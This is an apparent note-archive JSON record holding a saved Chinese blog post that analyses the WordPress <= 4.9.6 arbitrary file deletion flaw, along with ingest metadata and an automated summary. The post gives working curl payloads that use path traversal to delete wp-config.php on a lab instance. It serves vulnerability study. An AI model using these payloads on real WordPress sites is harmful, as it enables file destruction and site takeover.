src=\"../_resources/a07f40567f42be673fdc4761b25e13c4.png\"  type=\"image/png\" hash=\"a07f40567f42be673fdc4761b25e13c4\" title=\"Wordpress AFD\" width=\"576\" height=\"288\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">4.2 发送Payload: </p>\n<div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;\"><table STYLE=\"font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;\"><tbody STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><tr STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">1</div></pre></td><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">curl -v &apos;http://9c9b.vsplate.me/wp-admin/post.php?post=4&apos; -H &apos;Cookie: ***&apos; -d &apos;action=delete&amp;_wpnonce=***&apos;</div></pre></td></tr></tbody></table></div>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/4.2.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/2de50300224621b6e61935a590faebbe.png\"  type=\"image/png\" hash=\"2de50300224621b6e61935a590faebbe\" title=\"Wordpress AFD\" width=\"576\" height=\"359\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><strong STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;\">5. 刷新网页</strong></p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">已经可以重装网站。</p>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/5.1.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/541618cc2a3a51a47fda214bcfdd1e99.png\"  type=\"image/png\" hash=\"541618cc2a3a51a47fda214bcfdd1e99\" title=\"Wordpress AFD\" width=\"576\" height=\"454\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n\n      \n    </div>\n    <div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;\">\n      <a TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">Share</a>\n      \n      \n  <ul STYLE=\"margin:0px 0px 1.5em 1.5em;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style:none outside none;list-style-type:none;\"><li STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style-type:inherit;list-style-position:outside;\"><a HREF=\"https://blog.vulnspy.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">漏洞利用</a></li></ul>\n\n    </div>\n  </div></div></div><div STYLE=\"position:absolute;top:-1000px;left:-1000px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">Measure</div><div STYLE=\"margin-bottom:0px;position:absolute;top:-1000px;left:-1000px;line-height:1;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">Measure</div></div></div></div></div></div></div></div>\n</div>\n</en-note>      ",
      "content_path": null,
      "diff_base_variant_id": null,
      "metadata": {
        "checksum": "0a61c4cb2c4e0869117efb4e2805d0f58ce6ee819918fbfd673afda0cdbe98d2",
        "path": "backups/2023年6月/IT技术/Wordpress _= 4.9.6 任意文件删除漏洞.html"
      }
    },
    {
      "id": "61ed105e-250e-4082-b340-f771ff0a9e25",
      "note_id": "b7965ee0-4aaa-4255-97c0-f7d6c716ce52",
      "variant_type": "clean_text",
      "version": 1,
      "created_by": "evernote_ingest:v0",
      "created_at": "2025-11-10T15:43:31.380930Z",
      "content": "---\ntitle: Wordpress <= 4.9.6 任意文件删除漏洞\nupdated: 2018-12-23 14:50:58Z\ncreated: 2018-12-23 14:50:58Z\nsource: >-\n  https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/\n---\n\n Wordpress <= 4.9.6 任意文件删除漏洞\n\n作者:\n\nWordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。昨日RIPS团队公开了一个Wordpress的\n任意文件删除漏洞\n（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.\n\nWordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。\n\n昨日RIPS团队公开了一个Wordpress的\n任意文件删除漏洞\n（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.\n\n本文我们将结合 VulnSpy 的\n在线 WordPress 环境\n来演示该漏洞的利用。\n\nVulnSpy Wordpress 4.9 在线环境:\nhttp://www.vulnspy.com/wordpress-4.9/wordpress_4.9/\n\n漏洞分析\n\n文件wp-includes/post.php中：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\nfunction wp_delete_attachment( $post_id, $force_delete = false ) {\n ...\n $meta = wp_get_attachment_metadata( $post_id );\n ...\n if ( ! empty($meta['thumb']) ) {\n // Don't delete the thumb if another attachment uses it.\n if (! $wpdb->get_row( $wpdb->prepare( \"SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d\", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) {\n $thumbfile = str_replace(basename($file), $meta['thumb'], $file);\n /** This filter is documented in wp-includes/functions.php */\n $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );\n @ unlink( path_join($uploadpath['basedir'], $thumbfile) );\n }\n ...\n}\n\n$meta['thumb']\n来自与数据库，是图片的属性之一。代码未检查\n$meta['thumb']\n的内容，直接带入\nunlink\n函数，如果\n$meta['thumb']\n可控则可导致文件删除。\n\n文件/wp-admin/post.php中：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n...\nswitch($action) {\n...\n case 'editattachment':\n check_admin_referer('update-post_' . $post_id);\n ...\n // Update the thumbnail filename\n $newmeta = wp_get_attachment_metadata( $post_id, true );\n $newmeta['thumb'] = $_POST['thumb'];\n wp_update_attachment_metadata( $post_id, $newmeta );\n...\n\n$newmeta['thumb']\n来自于$_POST[‘thumb’]，未经过滤直接将其存入数据库，即上一步的\n$meta['thumb']\n可控。\n\n详细分析可见：WARNING: WordPress File Delete to Code Execution -\nhttps://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\n\n漏洞利用\n1. 使用VSPlate安装你的Wordpress 4.9\n\nWordpress 4.9 在线环境:\nhttp://www.vulnspy.com/wordpress-4.9/wordpress_4.9/\n\nWordpress AFD\n\n2. 登录后台，添加媒体\n\n访问\nhttp://9c9b.vsplate.me/wp-admin/upload.php\n,  上传任意图片.\n\nWordpress AFD\n\n3. 将 $meta[‘thumb’] 设置为我们要删除的文件\n\n3.1 点击第二步中我们上传的图片, 并记住图片ID.\n\nWordpress AFD\n\n3.2 访问\nhttp://9c9b.vsplate.me/wp-admin/post.php?post=4&action=edit\n. 在网页源代码中找到\n_wpnonce\n.\n\nWordpress AFD\n\n3.3 发送Payload:\n\n1\ncurl -v 'http://9c9b.vsplate.me/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php'\n\nWordpress AFD\n\n4. 删除文件\n\n4.1 在网页源码中找到另外一个\n_wpnonce\n.\n\nWordpress AFD\n\n4.2 发送Payload:\n\n1\ncurl -v 'http://9c9b.vsplate.me/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'\n\nWordpress AFD\n\n5. 刷新网页\n\n已经可以重装网站。\n\nWordpress AFD\n\nShare\n\n漏洞利用\n\nMeasure",
      "content_path": null,
      "diff_base_variant_id": null,
      "metadata": {
        "language": "en",
        "length": 2942,
        "rule_count": 3,
        "applied_rules": [
          {
            "rule_id": "social_handles",
            "description": "Drop standalone social handles and hashtags",
            "note": "removed social handle only lines"
          },
          {
            "rule_id": "dedupe_lines",
            "description": "Collapse adjacent duplicate lines",
            "note": "collapsed duplicate adjacent lines"
          },
          {
            "rule_id": "whitespace",
            "description": "Normalize whitespace",
            "note": "collapsed whitespace"
          }
        ]
      }
    }
  ],
  "extractions": [
    {
      "id": "28571a92-8d5c-4b8a-a9d2-29e637daa10a",
      "note_id": "b7965ee0-4aaa-4255-97c0-f7d6c716ce52",
      "extractor": "llm_enhance:v0#qwen3:30b",
      "payload": {
        "summary": "WordPress 4.9.6 存在任意文件删除漏洞，攻击者可利用上传图片修改元数据删除关键文件（如wp-config.php），导致网站被重装。漏洞未修复。",
        "keywords": [
          "WordPress",
          "漏洞",
          "任意文件删除",
          "安全",
          "4.9.6"
        ],
        "action_items": [
          "无"
        ],
        "source": "qwen3:30b",
        "category_path": [
          "商务"
        ],
        "new_category_suggestion": [
          "商务",
          "安全漏洞"
        ]
      },
      "version": 1,
      "created_at": "2025-11-12T04:48:52.085847Z",
      "created_by": "llm_enhance:v0",
      "quality_score": 0.32
    }
  ],
  "journal": {
    "id": "b9c25ad2-aa9d-43d0-895f-7264181186e1",
    "note_id": "b7965ee0-4aaa-4255-97c0-f7d6c716ce52",
    "stage": "ingest",
    "agent_id": "evernote_ingest:v0",
    "started_at": "2025-11-10T15:43:31.380934Z",
    "finished_at": "2025-11-10T15:43:31.380935Z",
    "status": "success",
    "input_ref": {
      "task_id": "5f2d7b83-e07c-49d0-b447-c71402017299",
      "source_path": "backups/2023年6月/IT技术/Wordpress _= 4.9.6 任意文件删除漏洞.html",
      "checksum": "0a61c4cb2c4e0869117efb4e2805d0f58ce6ee819918fbfd673afda0cdbe98d2"
    },
    "output_ref": {
      "ingest_source": "c97ee139-dc77-4174-bb25-7b0a1bd982a3",
      "note": "b7965ee0-4aaa-4255-97c0-f7d6c716ce52",
      "variants": [
        "509ddfac-b0cc-4ef9-b1aa-d9c13714bf04",
        "61ed105e-250e-4082-b340-f771ff0a9e25"
      ]
    },
    "error_detail": null
  },
  "llm": {
    "status": "success",
    "model": "qwen3:30b",
    "updated_at": "2025-11-12T04:48:52.085649Z",
    "latency_seconds": 52.83466316701379,
    "attempts": 1,
    "summary": {
      "summary": "WordPress 4.9.6 存在任意文件删除漏洞，攻击者可利用上传图片修改元数据删除关键文件（如wp-config.php），导致网站被重装。漏洞未修复。",
      "keywords": [
        "WordPress",
        "漏洞",
        "任意文件删除",
        "安全",
        "4.9.6"
      ],
      "action_items": [
        "无"
      ],
      "source": "qwen3:30b",
      "category_path": [
        "商务"
      ],
      "new_category_suggestion": [
        "商务",
        "安全漏洞"
      ]
    },
    "quality": {
      "score": 0.32,
      "metrics": {
        "input_chars": 2942.0,
        "input_lines": 128.0,
        "summary_chars": 79.0,
        "summary_coverage_ratio": 0.027,
        "keyword_hit_rate": 0.8,
        "action_item_count": 1.0,
        "unique_summary_sentences": 5.0,
        "estimated_read_seconds": 176.5
      }
    }
  }
}